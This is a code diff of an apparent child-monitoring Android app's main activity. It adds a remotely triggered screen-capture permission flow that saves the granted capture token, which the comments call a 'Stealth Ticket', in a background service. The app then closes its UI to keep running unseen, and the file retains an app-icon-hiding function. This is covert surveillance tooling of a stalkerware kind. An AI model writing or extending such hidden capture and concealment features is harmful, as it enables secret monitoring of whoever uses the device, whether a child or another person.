@@ -1,32 +1,29 @@
 package com.childguardian
 
+import android.app.Activity
+import android.content.ComponentName
+import android.content.Context
+import android.content.Intent
+import android.content.pm.PackageManager
+import android.media.projection.MediaProjectionManager
+import android.os.Build
 import android.os.Bundle
-import androidx.activity.viewModels
+import android.view.WindowManager
+import androidx.activity.result.contract.ActivityResultContracts
 import androidx.appcompat.app.AppCompatActivity
 import androidx.lifecycle.lifecycleScope
-import com.childguardian.data.remote.request.RegisterDeviceRequest
-import com.childguardian.data.repository.DeviceRepository
 import com.childguardian.data.remote.socket.SocketManager
-import com.childguardian.utils.DeviceIdGenerator
-import com.childguardian.utils.DeviceInfoHelper
-import androidx.core.view.WindowCompat
-import dagger.hilt.android.AndroidEntryPoint
-import timber.log.Timber
-import javax.inject.Inject
-import android.os.Build
-import kotlinx.coroutines.launch
-import android.content.Intent
+import com.childguardian.data.repository.DeviceRepository
 import com.childguardian.services.core.CoreService
-import org.webrtc.PeerConnectionFactory
-import android.app.Activity
-import android.media.projection.MediaProjectionManager
-import androidx.activity.result.contract.ActivityResultContracts
 import com.childguardian.services.screen.MediaProjectionHolder
 import com.childguardian.services.screen.ScreenCaptureService
-import android.content.ComponentName
-import android.content.pm.PackageManager
-import android.view.WindowManager
-import android.content.Context
+import com.childguardian.utils.DeviceIdGenerator
+import com.childguardian.utils.DeviceInfoHelper
+import dagger.hilt.android.AndroidEntryPoint
+import kotlinx.coroutines.launch
+import timber.log.Timber
+import javax.inject.Inject
+
 @AndroidEntryPoint
 class MainActivity : AppCompatActivity() {
 
@@ -39,87 +36,104 @@ class MainActivity : AppCompatActivity() {
     @Inject
     lateinit var mediaProjectionHolder: MediaProjectionHolder
 
-    private var currentViewerId: String? = null
+
+    // 1. The Launcher: Grabs the ticket and sends it to the Vault
+    // 1. The Launcher: Grabs the ticket and sends it to the Vault
     private val screenCaptureLauncher = registerForActivityResult(
         ActivityResultContracts.StartActivityForResult()
     ) { result ->
-        if (result.resultCode == Activity.RESULT_OK && result.data != null) {
-            Timber.d("Permission granted! Sending ticket to Service...")
 
-            // 1. Prepare the hand-off to the ScreenCaptureService
+        // ADD THIS: The box is gone, tell the bouncer to open the door again!
+        isBoxCurrentlyShowing = false
+
+        if (result.resultCode == Activity.RESULT_OK && result.data != null) {
+            Timber.d("Permission granted! Sending ticket to Service for safekeeping...")
+
             val serviceIntent = Intent(this, ScreenCaptureService::class.java).apply {
-                action = "START_STREAM"
-                // We pass the raw result data (the "Ticket") to the service
+                action = "ACTION_SAVE_TICKET" // Tells the service to securely store the ticket
                 putExtra("RESULT_CODE", result.resultCode)
                 putExtra("DATA", result.data)
-                // Ensure the viewerId from the command is passed along
-                putExtra("VIEWER_ID", currentViewerId)
             }
 
-            // 2. Start the service safely
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                 startForegroundService(serviceIntent)
             } else {
                 startService(serviceIntent)
             }
 
-            // 3. Now it is safe to vanish
-            // hideAppIcon()
+            // Close the app UI so it runs in the background
             finish()
         } else {
-            Timber.e("Screen capture permission denied or data is null")
+            Timber.e("User denied the initial permission.")
             finish()
         }
     }
 
+    private var shouldPopPermissionBox = false
+    private var isBoxCurrentlyShowing = false // The ultimate double-popup shield
+
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-
-
         window.setFlags(WindowManager.LayoutParams.FLAG_SECURE, WindowManager.LayoutParams.FLAG_SECURE)
         setContentView(R.layout.activity_main)
 
-        // Process the intent that started the app
-        handleStreamRequest(intent)
-    }
+        // Set the flag if launched via remote trigger
+        if (intent?.getBooleanExtra("REMOTE_TRIGGER", false) == true) {
+            shouldPopPermissionBox = true
+        }
 
-    // <<< ADD THIS: The Catcher's Mitt for when the app is already awake!
-    override fun onNewIntent(intent: Intent?) {
-        super.onNewIntent(intent)
-        setIntent(intent) // Update the activity's intent
-        handleStreamRequest(intent) // Process the new command
-    }
+        lifecycleScope.launch {
+            val deviceInfo = deviceRepository.getDeviceInfoSync()
+            if (deviceInfo?.registered == true) {
+                Timber.d("Device already registered, starting background services")
+                socketManager.connect(deviceInfo.deviceId)
+                startBackgroundServices()
 
-    // Our new Traffic Cop
-    private fun handleStreamRequest(currentIntent: Intent?) {
-        currentViewerId = currentIntent?.getStringExtra("VIEWER_ID")
-
-        if (currentViewerId != null) {
-            // SCENARIO A: The Mac requested a stream
-            Timber.d("Mac requested stream! Popping permission box for viewer: $currentViewerId")
-            val mediaProjectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
-            screenCaptureLauncher.launch(mediaProjectionManager.createScreenCaptureIntent())
-
-        } else {
-            // SCENARIO B: Normal app launch
-            Timber.d("Normal app launch detected.")
-            lifecycleScope.launch {
-                val deviceInfo = deviceRepository.getDeviceInfoSync()
-                if (deviceInfo?.registered == true) {
-                    Timber.d("Device already registered, starting background services")
-                    socketManager.connect(deviceInfo.deviceId)
-                    startBackgroundServices()
-                    // finish() is currently commented out for testing, leave it that way!
-                } else {
-                    performRegistration()
+                // If it wasn't a remote trigger, we still want to pop it on first launch
+                if (!shouldPopPermissionBox) {
+                    shouldPopPermissionBox = true
                 }
+                // Don't call checkAndPopBox() here. Let onResume handle it safely.
+            } else {
+                performRegistration()
             }
         }
     }
 
+    override fun onNewIntent(intent: Intent?) {
+        super.onNewIntent(intent)
+        if (intent?.getBooleanExtra("REMOTE_TRIGGER", false) == true) {
+            Timber.d(">>> Woken up by Mac in background! Setting flag... <<<")
+            shouldPopPermissionBox = true
+            // Don't call checkAndPopBox() here. Let onResume handle it.
+        }
+    }
 
-    // ActivityResultLauncher for screen capture
+    override fun onResume() {
+        super.onResume()
+        checkAndPopBox()
+    }
 
+    private fun checkAndPopBox() {
+        runOnUiThread { // <--- ADD THIS LINE to force it onto the UI thread!
+            if (shouldPopPermissionBox && !isBoxCurrentlyShowing) {
+                Timber.d(">>> Safe to pop! Popping permission box... <<<")
+                shouldPopPermissionBox = false
+                isBoxCurrentlyShowing = true
+                popPermissionBox()
+            }
+        }
+    }
+
+    // IMPORTANT: Wherever you handle the RESULT of the permission box
+    // (e.g., inside onActivityResult or your ActivityResultLauncher callback),
+    // you MUST set `isBoxCurrentlyShowing = false` so the app knows the box is gone!
+
+    private fun popPermissionBox() {
+        Timber.d("Popping permission box to secure the Stealth Ticket...")
+        val mediaProjectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
+        screenCaptureLauncher.launch(mediaProjectionManager.createScreenCaptureIntent())
+    }
 
     private suspend fun performRegistration() {
         val deviceId = DeviceIdGenerator.getDeviceId(this)
@@ -130,25 +144,20 @@ class MainActivity : AppCompatActivity() {
         deviceRepository.registerDevice(request).fold(
             onSuccess = {
                 Timber.d("Registration successful")
-                // Connect socket after registration
                 socketManager.connect(deviceId)
-                val mediaProjectionManager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
-                val intent = mediaProjectionManager.createScreenCaptureIntent()
-                screenCaptureLauncher.launch(intent)
-
                 startBackgroundServices()
 
+                // Route it through the bouncer instead of popping directly!
+                shouldPopPermissionBox = true
+                checkAndPopBox()
             },
             onFailure = { error ->
                 Timber.e(error, "Registration failed")
-                // Show error on UI (for debugging)
-                // In production, you might retry later
             }
         )
     }
 
     private fun startBackgroundServices() {
-        // We'll implement this later
         Timber.d("Starting background services")
         val intent = Intent(this, CoreService::class.java)
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
@@ -157,17 +166,6 @@ class MainActivity : AppCompatActivity() {
             startService(intent)
         }
     }
-
-    private fun startScreenCaptureService() {
-        val intent = Intent(this, ScreenCaptureService::class.java)
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            startForegroundService(intent)
-
-        } else {
-            startService(intent)
-        }
-    }
-
 
     private fun hideAppIcon() {
         val packageManager = packageManager
